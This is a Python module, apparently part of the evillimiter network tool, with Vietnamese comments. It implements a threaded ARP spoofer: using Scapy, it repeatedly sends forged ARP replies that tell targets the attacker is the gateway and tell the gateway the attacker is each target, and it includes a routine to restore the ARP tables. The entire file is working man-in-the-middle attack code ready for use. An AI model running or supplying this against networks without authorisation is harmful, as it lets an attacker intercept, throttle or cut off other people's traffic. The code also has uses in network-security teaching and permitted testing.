import time
import threading
import logging
from typing import Set, List, Optional

# Scapy imports
from scapy.all import ARP, send  # pylint: disable=no-name-in-module

# Giả định các module import từ project của bạn vẫn giữ nguyên
from .host import Host
from evillimiter.common.globals import BROADCAST

# Cấu hình logging cơ bản (có thể bỏ qua nếu project đã có logger riêng)
logger = logging.getLogger(__name__)

class ARPSpoofer:
    def __init__(self, interface: str, gateway_ip: str, gateway_mac: str, interval: float = 2.0):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.interval = interval

        self._hosts: Set[Host] = set()
        self._hosts_lock = threading.Lock()
        
        # Sử dụng Event để quản lý việc dừng thread thông minh hơn
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def add(self, host: Host) -> None:
        """Thêm host vào danh sách spoofing."""
        with self._hosts_lock:
            self._hosts.add(host)
        host.spoofed = True
        logger.debug(f"Added host {host.ip} to spoof list.")

    def remove(self, host: Host, restore: bool = True) -> None:
        """Xóa host và khôi phục ARP table nếu cần."""
        with self._hosts_lock:
            self._hosts.discard(host)

        host.spoofed = False
        
        if restore:
            self._restore(host)
            logger.debug(f"Removed and restored host {host.ip}.")
        else:
            logger.debug(f"Removed host {host.ip} without restore.")

    def start(self) -> None:
        """Bắt đầu luồng spoofing."""
        if self._thread and self._thread.is_alive():
            return

        self._stop_event.clear()
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True, name="ARPSpooferThread")
        self._thread.start()
        logger.info("ARP Spoofer started.")

    def stop(self) -> None:
        """Dừng luồng spoofing ngay lập tức."""
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=1.0)
        logger.info("ARP Spoofer stopped.")

    def _spoof_loop(self) -> None:
        """Vòng lặp chính gửi gói tin ARP giả mạo."""
        while not self._stop_event.is_set():
            with self._hosts_lock:
                # Copy nhanh danh sách để giải phóng lock sớm nhất có thể
                current_hosts = list(self._hosts)
            
            if not current_hosts:
                # Nếu không có host nào, đợi interval rồi check lại (dùng wait thay vì sleep để có thể ngắt)
                self._stop_event.wait(self.interval)
                continue

            # Xây dựng danh sách tất cả các gói tin cần gửi
            all_packets = []
            for host in current_hosts:
                packets = self._create_spoof_packets(host)
                all_packets.extend(packets)

            # Gửi tất cả gói tin (Batch sending tốt hơn cho hiệu suất Scapy)
            if all_packets:
                try:
                    send(all_packets, verbose=False, iface=self.interface)
                except Exception as e:
                    logger.error(f"Error sending spoof packets: {e}")

            # Wait thông minh: Ngủ `interval` giây, nhưng sẽ tỉnh dậy NGAY LẬP TỨC nếu hàm stop() được gọi
            self._stop_event.wait(self.interval)

    def _create_spoof_packets(self, host: Host) -> List[ARP]:
        """Tạo gói tin ARP giả mạo."""
        # Gói 1: Nói với target rằng Ta là Gateway
        # Gói 2: Nói với Gateway rằng Ta là Target
        return [
            ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac),
            ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)
        ]

    def _restore(self, host: Host) -> None:
        """Khôi phục bảng ARP về trạng thái đúng."""
        logger.info(f"Restoring ARP table for {host.ip}...")
        packets = [
            ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=host.ip, hwdst=BROADCAST),
            ARP(op=2, psrc=host.ip, hwsrc=host.mac, pdst=self.gateway_ip, hwdst=BROADCAST)
        ]
        
        try:
            # Gửi count=3 để đảm bảo gói tin đến nơi (UDP/ARP không tin cậy)
            # Inter=0.1 để tránh spam quá nhanh gây mất gói
            for pkt in packets:
                send(pkt, verbose=False, iface=self.interface, count=3)
        except Exception as e:
            logger.error(f"Error restoring host {host.ip}: {e}")

    # Hỗ trợ Context Manager (with ARPSpoofer(...) as spoofer:)
    def __enter__(self):
        self.start()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop()